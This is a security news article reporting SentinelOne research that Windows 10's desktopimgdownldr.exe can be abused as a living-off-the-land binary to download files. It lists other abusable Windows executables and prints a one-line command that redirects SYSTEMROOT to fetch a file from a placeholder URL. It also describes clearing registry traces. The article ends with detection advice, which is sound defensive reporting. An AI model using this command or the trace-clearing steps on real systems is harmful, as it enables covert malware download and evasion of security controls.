@@ -1,0 +1,197 @@
+
+	   
+
+
+A binary in Windows 10 responsible for setting an image for the desktop and lock screen can help attackers download malware on a compromised system without raising the alarm.
+
+Known as living-off-the-land binaries (LoLBins), these files come with the operating system and have a legitimate purpose. Attackers of all colors are abusing them in post-exploitation phases to hide malicious activity.
+
+The new LoL in the Bin
+
+An attacker can use LoLBins to download and install malware, bypass security controls such as UAC or WDAC. Typically, the attack involves fileless malware and reputable cloud services.
+
+
+1/1
+
+
+
+
+
+Skip Ad
+ 
+Continue watchingafter the adVisit Advertiser websiteGO TO PAGE.cnx-non-linear-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:none;width:100%;height:100%}.cnx-non-linear-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-non-linear-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-non-linear-ad-container .cnx-ad-slot video,.cnx-non-linear-ad-container video.cnx-ad-slot{background-color:unset}.cnx-ad-container .cnx-ad-bid-slot{position:absolute;top:0;left:0;grid-area:adslot;opacity:0;background:#f4f4f4;width:100%;height:100%}.cnx-ad-container .cnx-ad-bid-slot.cnx-ad-bid-slot-selected{opacity:1;z-index:10}.cnx-ad-container .cnx-ad-slot{display:flex;position:absolute;top:0;left:0;justify-content:center;align-items:center;width:100%;height:100%;overflow:hidden}.cnx-ad-container .cnx-ad-slot div{background-color:rgba(0,0,0,0) !important}.cnx-ad-container .cnx-ad-slot iframe{box-sizing:border-box;border:3px solid #fff !important;color-scheme:none}.cnx-ad-container .cnx-ad-slot iframe:not([id]){border:none !important}.cnx-ad-container .cnx-ad-slot-video-type iframe{border:none !important}.cnx-ad-container .cnx-ad-slot video,.cnx-ad-container video.cnx-ad-slot{background-color:#f4f4f4}A report from Cisco Talos last year provides a list of 13 Windows native executables that can download or execute malicious code:
+
+powershell.exe
+	bitsadmin.exe
+	certutil.exe
+	psexec.exe
+	wmic.exe
+	mshta.exe
+	mofcomp.exe
+	cmstp.exe
+	windbg.exe
+	cdb.exe
+	msbuild.exe
+	csc.exe
+	regsvr32.exe
+Researchers from SentinelOne discovered that "desktopimgdownldr.exe," located in Windows 10's system32 folder, can also serve as a LoLBin.
+
+The executable is part of the Personalization CSP (configuration service provider) that allows, among others, defining the lock screen and desktop background images.
+
+In both cases, the setting accepts JPG, JPEG, PNG files that are stored locally or remotely (supports HTTP/S URLs).
+
+Simple tricks
+
+SentinelOne's Gal Kristal says that running desktopimgdownldr.exe with administrator privileges overrules the user-defined lock screen image, alerting of something suspicious.
+
+This can be avoided, though, if the attacker deletes a registry value immediately after running executing the binary, leaving the user none the wiser.
+
+Kristal found that while the executable appears to require high privileges (admin) so that it can create files in C:\Windows and in the registry, it can also run as a standard user to download files from an external source.
+
+This is possible by changing the location of the %systemroot% environment variable before executing the binary. This results in modifying the download destination and bypassing access checks.
+
+set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
+
+Without administrator rights, writing to the registry is not possible, so the lock screen image remains unchanged. In this scenario, the method creates no other artifacts than the downloaded file.
+
+If the attacker gains admin privileges, they can delete all the tracks created by the downloader in the Windows registry for Personalization CSP.
+
+Kristal says that the executable uses BITS COM Object to download a file and on some machines it tries to locate the COM+ Registration Catalog in the %systemroot% location. Since the attacker changes the environment variable, the attempt fails.
+
+By creating a symbolic link with the mklink.exe utility, though, a standard user can fix this problem, Kristal says in research published today.
+
+He recommends Users of Endpoint Detection and Response solutions to add "desktopimgdownldr.exe" to their queries and watchlists and treat it just like "certutil.exe," a widely used LoLBin, by both advanced hackers doing a government’s bidding and cybercriminals set on scoring big money.
+
+Update [July 2, 18:36]: Article updated to clarify that the executable tries to locate the COM+ Registration Catalog only on some machines.
+
+	   
+
+.ia_ad {
+    background-color: #f0f6ff;
+    width: 95%;
+    max-width: 800px;
+    margin: 15px auto;
+    border-radius: 8px;
+    border: 1px solid #d6ddee;
+    display: flex;
+    align-items: stretch;
+    padding: 0;
+    overflow: hidden;
+}
+
+.ia_lef {
+    flex: 1;
+    max-width: 200px;
+    height: auto;
+    display: flex;
+    align-items: stretch;
+}
+
+.ia_lef a {
+    display: flex;
+    width: 100%;
+    height: 100%;
+}
+
+
+.ia_lef a img {
+    width: 100%;
+    height: 100%;
+    object-fit: cover;
+    border-radius: 8px 0 0 8px;
+    margin: 0;
+    display: block;
+}
+
+.ia_rig {
+    flex: 2;
+    padding: 10px;
+    display: flex;
+    flex-direction: column;
+    justify-content: center;
+}
+
+.ia_rig h2 {
+    font-size: 17px !important;
+    font-weight: 700;
+    color: #333;
+    line-height: 1.4;
+    font-family: Georgia, "Times New Roman", Times, serif;
+    margin: 0 0 14px 0;
+}
+
+.ia_rig p {
+    font-weight: bold;
+    font-size: 14px;
+    margin: 0 0 clamp(6px, 2vw, 14px) 0;
+}
+
+.ia_button {
+    background-color: #FFF;
+    border: 1px solid #3b59aa;
+    color: black;
+    text-align: center;
+    text-decoration: none;
+    border-radius: 8px;
+    display: inline-block;
+    font-size: 16px;
+    font-weight: bold;
+    cursor: pointer;
+    padding: 10px 20px;
+    width: fit-content;
+}
+
+.ia_button a {
+    text-decoration: none;
+    color: inherit;
+    display: block;
+}
+
+@media (max-width: 600px) {
+    .ia_ad {
+        flex-direction: column;
+        align-items: center;
+    }
+
+    .ia_lef {
+        max-width: 100%;
+    }
+
+    .ia_lef a img {
+        border-radius: 8px 8px 0 0;
+    }
+
+
+    .ia_rig {
+        padding: 15px;
+        width: 100%;
+    }
+
+    .ia_button {
+        width: 100%;
+	margin: 0px auto;
+    }
+}
+
+
+
+    
+        
+            
+        
+    
+    
+        Red Report 2025: Analyzing the Top ATT&CK Techniques Used by 93% of Malware 
+Malware targeting password stores surged 3X as attackers executed stealthy Perfect Heist scenarios, infiltrating and exploiting critical systems.
+Discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.
+        Read the Red Report 2025
+    
+
+
+           
+          
+            Related Articles:
+	     Microsoft warns of Windows update delays due to wrong timestampMicrosoft confirms Family Safety blocks Google Chrome from launchingWindows 10 users can get extended security updates using Microsoft pointsMicrosoft fixes Surface Hub boot issues with emergency updateReVault flaws let hackers bypass Windows login on Dell laptops
+	  
+ 
+	  
